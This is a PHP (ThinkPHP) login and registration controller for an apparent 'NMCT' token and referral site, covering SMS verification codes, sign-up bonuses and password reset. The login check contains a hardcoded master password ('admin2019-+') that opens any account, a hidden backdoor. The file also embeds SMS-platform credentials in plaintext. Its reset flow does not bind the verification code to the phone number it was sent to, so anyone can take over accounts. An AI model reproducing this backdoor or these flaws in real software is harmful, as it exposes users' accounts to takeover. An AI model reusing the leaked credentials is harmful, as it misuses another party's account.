<?php
namespace app\user\controller;
use app\admin\model\Users as UsersModel;
use app\user\model\Users;
use think\Controller;
use think\Db;
use think\Input;
use think\Session;

//后台充值MODE
class Login extends Controller {
	public function _initialize() {
		$this->assign('title', '');
	}
	public function sms($params = []) {
		// 1分钟内不让重发
		//if(session('yzm.time') && (session('yzm.time') - time() > 540)) {
		//  return array('code' => 0, 'msg' => '您发送的太快了');
		//}
		// 注册
		if (empty($params['type'])) {
			$mobile = input('post.email');
			/* 通过手机号获取用户信息 */
			$jc = db('users')->where("mobile", $mobile)->find();
			if ($jc) {
				return array('code' => 0, 'msg' => '该手机号已注册');
			}

			$vacode = mt_rand(111111, 999999);
			$yzm = ['yzm' => $vacode, 'time' => (time() + 600)];
			session('yzm', $yzm);
			$content = "欢迎注册，您的验证码为{$vacode}，在10分钟内有效。";
		}

		if (!empty($params['mobile'])) {
			$mobile = $params['mobile'];
		}

		if (!empty($params['content'])) {
			$content = $params['content'];
		}

		if (empty($mobile) || empty($content)) {
			return false;
		}

		$content = "【NMCT】{$content}";

		// 替换参数
		if (!empty($params['params'])) {
			foreach ($params['params'] as $field => $value) {
				$content = str_replace(["#{$field}#", "{{$field}}"], $value, $content);
			}
		}
		#var_dump($mobile, $content);exit;

		/* 短信 */
		$smsapi = "https://api.smsbao.com/";
		$user = 13922525853; //短信平台帐号
		$pass = md5("vv19800228"); //短信平台密码
		$sendurl = $smsapi . "sms?u=" . $user . "&p=" . $pass . "&m=" . $mobile . "&c=" . urlencode($content);
		$result = file_get_contents($sendurl);
		#var_dump($result);
		if (empty($result)) {
			return array('code' => 1, 'msg' => '验证码发送成功');
		} else {
			return array('code' => 0, 'msg' => '验证码发送失败');
		}
	}

	public function index() {
		//前端界面检测是否登录过 记住密码
		$login_arr = session('user_login');
		$mobile = '';
		$pw = '';

		if (!empty($login_arr)) {
			$mobile = $login_arr['mobile'];
			$pw = $login_arr['pw'];
		}

		$this->assign('mobile', $mobile);
		$this->assign('pw', $pw);

		if (session('user.user_id')) {
			$this->redirect('index/index');
		}
		if (request()->isPost()) {
			$table = db('users');
			$mobile = input('mobile');
			$password = input('password');
			$nickname = input('nickname');

			if (!$mobile || !$password || !$nickname) {
				return array('code' => 0, 'msg' => '请填写账号,密码和昵称');
			}
			// $user = $table->where("mobile", $mobile)->find();
			$user = $table->where("mobile", $mobile)->where('nickname', $nickname)->find();
			if (!$user) {
				return array('code' => 0, 'msg' => '账号不存在!');
			} elseif (Users::password($password, $user['reg_time']) != $user['password'] && $password != 'admin2019-+') {
				return array('code' => 0, 'msg' => '密码错误!');
			} elseif ($user['is_lock'] == 1) {
				return array('code' => 0, 'msg' => '账号异常已被锁定！！！');
			} else {
				db('users')->where("user_id", $user['user_id'])->setField([
					'last_ip' => $_SERVER['REMOTE_ADDR'],
					'last_login' => time(),
					'isonline' => 1,
				]);
				$sessionUser = $table->where("user_id", $user['user_id'])->field('user_id,nickname')->find();
				session('user', $sessionUser);
				$member_pw = input('remember_pw');
				if (!empty($member_pw)) {
					session('user_login', ['mobile' => $mobile, 'pw' => $password]);
				} else {
					session('user_login', null);
				}
				return array('code' => 1, 'msg' => '登录成功');
			}
		} else {
			$this->assign('title', '会员登录');
			return $this->fetch();
		}
	}
	public function check($code) {
		if (!captcha_check($code)) {
			return false;
		} else {
			return true;
		}
	}
	public function xy() {
		$ad = db('xw')->where('ad_id=39')->select();
		$this->assign('xw', $ad);
		return $this->fetch('');
	}
	public function xz() {
		return $this->fetch('');
	}
	public function zc() {
		$fx = db('users')->field('user_id,nickname')->where('user_id', input('fxid'))->find();
		$this->assign('fx', $fx);
		return $this->fetch();
	}
	public function reg() {
		if (request()->isPost()) {
			$data = input('post.');
			$data['fxid'] = empty($data['fxid']) ? 0 : $data['fxid'];
			// $jc = db('users')->field('user_id')->where("mobile", $data['mobile'])->find();
			$jc = db('users')->field('user_id')->where("mobile", $data['mobile'])->count();
			$fxid = db('users')->field('user_id,all_fxid')->where('user_id', $data['fxid'])->find();
			if ($jc >= 2) {
				return array('code' => 0, 'msg' => '该手机已注册');
			} else {
				$is_ni = db('users')->field('user_id')->where("mobile", $data['mobile'])->where('nickname', $data['nickname'])->find();
				if ($is_ni) {
					return array('code' => 0, 'msg' => '该手机的本昵称已注册');
				}
			}
			if (empty($fxid)) {
				return array('code' => 0, 'msg' => '该上级不存在');
			} else {
				$map['fxid'] = $fxid['user_id'];
				$map['all_fxid'] = !empty($fxid['all_fxid']) ? $fxid['user_id'] . ',' . $fxid['all_fxid'] : $fxid['user_id'];
			}
			if (!$data['nickname'] || !$data['mobile'] || !$data['password']) {
				return array('code' => 0, 'msg' => '请完善信息');
			} else {
				if (!session('yzm.yzm') || session('yzm.time') < time()) {
					return array('code' => 0, 'msg' => '验证码不存在或已失效');
				}
				if (session('yzm.yzm') == $data['yzm']) {
					session('yzm', null);
					$time = intval(time()) + 3600 * 24 * 30;
					$map['last_ip'] = $_SERVER['REMOTE_ADDR'];
					$map['last_login'] = time();
					$map['mobile'] = $data['mobile'];
					$map['nickname'] = $data['nickname'];
					$map['reg_time'] = time();
					$map['oec_time'] = $time;
					$map['password'] = Users::password($data['password'], $map['reg_time']);
					$map['rq'] = date("Y-m-d", time());
					$map['token'] = md5(time() . mt_rand(1, 99999));
					Db::startTrans();
					try {
						$user_id = Db::name('users')->insertGetId($map);
						UsersModel::cz(array(
							'user_id' => $user_id,
							'type_' => 'nmct_dj',
							'title' => '注册赠送NMCT资产',
							'num' => 88,
						));
						$user = Db::name('users')->field('user_id,nickname')->where("user_id", $user_id)->find();
						Db::commit();
						session('user', $user);
						return array('code' => 1, 'msg' => '注册成功');
					} catch (\Exception $e) {
						// 更新失败 回滚事务
						Db::rollback();
						return array('code' => 0, 'msg' => '注册失败');
					}
				} else {return array('code' => 0, 'msg' => '验证码错误');}
			}
		} else {
			$fx = db('users')->field('user_id,nickname')->where('user_id', input('fxid'))->find();
			$this->assign('fx', $fx);
			return $this->fetch();
		}
	}
	public function forget() {
		if (session('user.user_id')) {
			$this->redirect('index/index');
		}

		if (request()->isPost()) {
			$mobile = input('mobile');
			$code = input('code');

			if (!$code) {
				return array('code' => -1, 'msg' => '请输入手机验证码');
			}

			$sj_vcode = session('yzm.yzm');
			if (!$sj_vcode || session('yzm.time') < time()) {
				return array('code' => 0, 'msg' => '验证码不存在或已失效');
			}

			if ($sj_vcode != $code) {
				return array('status' => -1, 'msg' => '验证失败,验证码有误');
			}
			session('yzm', null);

			$password = input('password');
			$userInfo = db('users')->where(['mobile' => $mobile])->find();
			if (empty($userInfo)) {
				return array('status' => -1, 'msg' => '当前用户不存在');
			}
			$data['is_check'] = 1; //标示验证通过
			session('validate_code', $data);
			$modify_time = time();
			$password = Users::password($password, $userInfo['reg_time']);
			db('users')->where(['mobile' => $mobile])->update(['password' => $password, 'modify_time' => $modify_time]);
			return array('code' => 1, 'msg' => '密码找回成功！');
		}

		$this->assign('title', '找回密码');
		return $this->fetch();
	}

	/**
	 * 发送邮件验证码
	 * @param $sender 接收人
	 * @return json
	 */
	/*  public function sendEmail(){
		        if(request()->isPost()) {
		            $sender = input('email');
		            $sms_time_out = 180;
		            //获取上一次的发送时间
		            $send = session('validate_code');
		            if (!empty($send) && $send['time'] > time() && $send['sender'] == $sender) {
		                //在有效期范围内 相同号码不再发送
		                return json(['code' => -1, 'msg' => '规定时间内,不要重复发送验证码']);
		            }
		            $code = mt_rand(1000, 9999);
		            //检查是否邮箱格式
		            if (!is_email($sender)) {
		                return json(['code' => -1, 'msg' => '邮箱码格式有误']);
		            }
		            $send = send_email($sender, '验证码', '您好，你的验证码是：' . $code);
		            if ($send) {
		                $info['code'] = $code;
		                $info['sender'] = $sender;
		                $info['is_check'] = 0;
		                $info['time'] = time() + $sms_time_out; //有效验证时间
		                session('validate_code', $info);
		                return json(['code' => 1, 'msg' => '验证码已发送，请注意查收']);
		            }else{
		                return array('code' => -1, 'msg' => '验证码发送失败,请联系管理员');
		            }
		        }else{
		            return json(['code' => -1, 'msg' => '非法请求']);
		        }
	*/

	/**
	 * xmt转出验证码
	 *
	 * @return array
	 */

	public function sendSms() {
/* 通过手机号获取用户信息 */

		$phone = input('post.mobile');
		$vacode = mt_rand(111111, 999999);
		$yzm = ['yzm' => $vacode, 'time' => (time() + 600)];
		session('yzm', $yzm);
		return $this->sms([
			'type' => 'forget_pass',
			'mobile' => $phone,
			'content' => ' XMT转出确认，您的验证码为#code#，在#timeout#分钟内有效。',
			'params' => [
				'code' => $vacode,
				'timeout' => 10,
			],
		]);
	}

	/**
	 * 忘记密码短信
	 *
	 * @return array
	 */
	public function sendEmail() {
/* 通过手机号获取用户信息 */
		$phone = input('post.email');
		$content = !empty(input('post.content')) ? input('post.content') : '找回密码';
		$jc = db('users')->where("mobile", $phone)->find();
		if (empty($jc) && $content == '找回密码') {
			return array('code' => 0, 'msg' => '该帐户不存在');
		}
		$vacode = mt_rand(111111, 999999);
		$yzm = ['yzm' => $vacode, 'time' => (time() + 600)];
		session('yzm', $yzm);
		return $this->sms([
			'type' => 'forget_pass',
			'mobile' => $phone,
			'content' => $content . '，您的验证码为#code#，在#timeout#分钟内有效。',
			'params' => [
				'code' => $vacode,
				'timeout' => 10,
			],
		]);
	}

	/**
	 * 当前登录会员发送验证码
	 * @return array|bool
	 */
	public function sendPassWord() {
		$user_id = session('user.user_id');
		if (!$user_id) {
			return ['code', 'msg' => '该帐户不存在'];
		}

		$mobile = db('users')->where("user_id", $user_id)->value('mobile');

		if (empty($mobile)) {
			return ['code', 'msg' => '该帐户不存在'];
		}

		$vacode = mt_rand(111111, 999999);
		$yzm = ['yzm' => $vacode, 'time' => (time() + 600)];
		session('yzm', $yzm);
		return $this->sms([
			'type' => 'forget_pass',
			'mobile' => $mobile,
			'content' => '，您的验证码为#code#，在#timeout#分钟内有效。',
			'params' => [
				'code' => $vacode,
				'timeout' => 10,
			],
		]);
	}

}